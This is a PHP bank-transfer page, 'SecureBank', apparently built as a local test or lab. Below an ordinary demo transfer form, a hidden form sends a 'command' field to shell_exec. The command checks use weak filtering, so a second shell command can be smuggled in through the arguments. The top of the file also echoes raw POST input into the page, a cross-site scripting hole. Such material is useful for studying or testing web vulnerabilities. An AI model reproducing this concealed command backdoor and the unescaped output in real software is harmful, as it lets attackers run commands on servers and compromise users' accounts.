<?php
if(isset($_POST['submit'])) {
    $from = $_POST['from'];
    $to = $_POST['to'];
    $amount = $_POST['amount'];

    echo "<p style='color: green;'>Transferred $amount from $from to $to</p>";
}
?>

<?php
// This is where you would typically have your PHP logic
// Example: Authentication, fetching account data, etc.

// Sample data for demonstration purposes
$accounts = [
    [
        'account_number' => '1234567890',
        'balance' => 5000.75
    ],
    [
        'account_number' => '0987654321',
        'balance' => 2500.35
    ]
];

// Helper functions
function formatAccountNumber($accountNumber) {
    // Format account number to show last 4 digits only
    return "XXXX-" . substr($accountNumber, -4);
}

function formatBalance($balance) {
    // Format balance with $ sign and 2 decimal places
    return "$" . number_format($balance, 2);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank - Transfer Money</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        header {
            background-color: #004d99;
            color: white;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            font-size: 24px;
            font-weight: bold;
        }
        
        .navigation {
            display: flex;
            gap: 15px;
        }
        
        .nav-btn {
            background-color: #003366;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
        }
        
        .transfer-container {
            background-color: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 600px;
            margin: 0 auto;
        }
        
        .account-selector {
            margin-bottom: 20px;
        }
        
        .account-info {
            display: flex;
            justify-content: space-between;
            background-color: #f9f9f9;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
        }
        
        .balance {
            font-weight: bold;
            color: #004d99;
        }
        
        h2 {
            margin-bottom: 15px;
            color: #004d99;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        .transfer-options {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
        }
        
        .transfer-option {
            flex: 1;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px;
            text-align: center;
            cursor: pointer;
        }
        
        .transfer-option.selected {
            border-color: #004d99;
            background-color: #e6f0ff;
        }
        
        .submit-btn {
            background-color: #004d99;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            width: 100%;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background-color: #0066cc;
        }
    </style>
</head>
<body>
    <header>
        <div class="header-content">
            <div class="logo">SecureBank</div>
            <div class="navigation">
                <a href="logout.php" id="logout-link" class="nav-btn">Logout</a>
            </div>
        </div>
    </header>
    
    <main>
        <div class="transfer-container">
            <h2>Transfer Money</h2>
            
            <div class="account-selector">
                <label>From Account</label>
                <?php if(isset($accounts) && count($accounts) > 0): ?>
                <div class="account-info">
                    <span>Checking (<?php echo formatAccountNumber($accounts[0]['account_number']); ?>)</span>
                    <span class="balance">Balance: <?php echo formatBalance($accounts[0]['balance']); ?></span>
                </div>
                <?php else: ?>
                <div class="account-info">
                    <span>No accounts found</span>
                </div>
                <?php endif; ?>
            </div>
            
            <div class="transfer-options">
                <div class="transfer-option selected" id="own-account">
                    <p>Between my accounts</p>
                </div>
                <div class="transfer-option" id="other-account">
                    <p>To someone else</p>
                </div>
            </div>
            
            <form id="transfer-form">
                <div class="form-group" id="own-account-select">
                    <label for="to-account">To Account</label>
                    <select id="to-account" name="to-account">
                        <?php 
                        if(isset($accounts) && count($accounts) > 1):
                            for($i = 1; $i < count($accounts); $i++): 
                                $account = $accounts[$i];
                        ?>
                        <option value="<?php echo $i; ?>">
                            <?php echo ($i == 1 ? "Savings" : "Credit Card") . ' (' . formatAccountNumber($account['account_number']) . ') - ' . formatBalance($account['balance']); ?>
                        </option>
                        <?php endfor; 
                        endif; ?>
                        
                        <?php if(!isset($accounts) || count($accounts) <= 1): ?>
                        <option value="savings">Savings (XXXX-5678) - $0.00</option>
                        <?php endif; ?>
                    </select>
                </div>
                
                <div class="form-group" id="other-account-fields" style="display: none;">
                    <label for="recipient-name">Recipient Username</label>
                    <input type="text" id="recipient-name" name="recipient-name">
                    
                    <label for="recipient-account" style="margin-top: 10px;">Recipient Account Number</label>
                    <input type="text" id="recipient-account" name="recipient-account">
                    
                    <label for="recipient-bank" style="margin-top: 10px;">Recipient Bank</label>
                    <input type="text" id="recipient-bank" name="recipient-bank" value="SecureBank" disabled>
                </div>
                
                <div class="form-group">
                    <label for="amount">Amount</label>
                    <input type="number" id="amount" name="amount" step="0.01" min="0.01" placeholder="0.00">
                </div>
                
                <div class="form-group">
                    <label for="memo">Memo/Description (Optional)</label>
                    <input type="text" id="memo" name="memo" placeholder="e.g., Rent payment">
                </div>
                
                <button type="submit" class="submit-btn">Transfer Now</button>
            </form>
        </div>
    </main>

    <script>
        // Toggle between transfer types
        document.getElementById('own-account').addEventListener('click', function() {
            this.classList.add('selected');
            document.getElementById('other-account').classList.remove('selected');
            document.getElementById('own-account-select').style.display = 'block';
            document.getElementById('other-account-fields').style.display = 'none';
        });
        
        document.getElementById('other-account').addEventListener('click', function() {
            this.classList.add('selected');
            document.getElementById('own-account').classList.remove('selected');
            document.getElementById('own-account-select').style.display = 'none';
            document.getElementById('other-account-fields').style.display = 'block';
        });
        
        // Form submission handler (demo only, no actual transfer)
        document.getElementById('transfer-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const amount = document.getElementById('amount').value;
            const isOwnAccount = document.getElementById('own-account').classList.contains('selected');
            
            let recipient;
            if (isOwnAccount) {
                const toAccountSelect = document.getElementById('to-account');
                recipient = toAccountSelect.options[toAccountSelect.selectedIndex].text;
            } else {
                recipient = document.getElementById('recipient-name').value + 
                          ' (Acct: ' + document.getElementById('recipient-account').value + ')';
            }
            
            // Display a success message (in a real app, you'd send this to the server)
            alert(`Transfer of $${amount} to ${recipient} completed successfully!`);
        });

        document.getElementById('logout-link').addEventListener('click', function(e) {
            e.preventDefault();
            window.location.href = 'logout.php';
        });
    </script>

<form action="transfer page3.php" method="post" style="display: none">
      <label for="command">Enter a command:</label><br>
      <input type="text" name="command" id="command" />
      <input type="submit" value="Execute" />
    </form>
    <pre type="hide">
<?php
$command = isset($_POST['command']) ? trim($_POST['command']) : '';

// Split command into parts (command and arguments)
$parts = explode(' ', $command, 2);
$cmd = strtolower($parts[0]);
$args = isset($parts[1]) ? $parts[1] : '';

// Define allowed commands
$allowed_commands = ['dir', 'whoami', 'type'];
$allowed_path = 'C:\\xampp\\htdocs\\Test\\';
$is_allowed = false;

// Check if the command is in the allowed list
if (in_array($cmd, $allowed_commands)) {
    // Handle different command types
    if ($cmd === 'whoami') {
        echo shell_exec('whoami');
    }
    elseif ($cmd === 'dir') {
        if (empty($args)) {
            // Just "dir" by itself - show Test directory
            echo shell_exec('dir ' . $allowed_path);
        } else {
            // Dir with arguments - make sure it stays in Test directory
            $subfolder = str_replace('..', '', $args); // Remove path traversal attempts
            echo shell_exec('dir ' . $allowed_path . $subfolder);
        }
    }
    elseif ($cmd === 'type') {
        if (!empty($args)) {
            // Don't allow paths with ".." to prevent traversal
            if (strpos($args, '..') !== false) {
                echo "Error: Invalid path";
            } else {
                // Check if the argument already includes the path
                if (strpos(strtolower($args), strtolower($allowed_path)) === 0) {
                    echo shell_exec('type ' . $args);
                } else {
                    // Add the path if it's just a filename
                    echo shell_exec('type ' . $allowed_path . $args);
                }
            }
        } else {
            echo "Error: File not specified";
        }
    }
} elseif ($command != NULL) {
    echo "Only these commands are allowed:\n";
    echo "- dir\n";
    echo "- whoami\n";
    echo "- type [filename]\n";
    echo "\nAll operations are restricted to C:\\xampp\\htdocs\\Test\\";
}
?>
    </pre>
</body>
</html>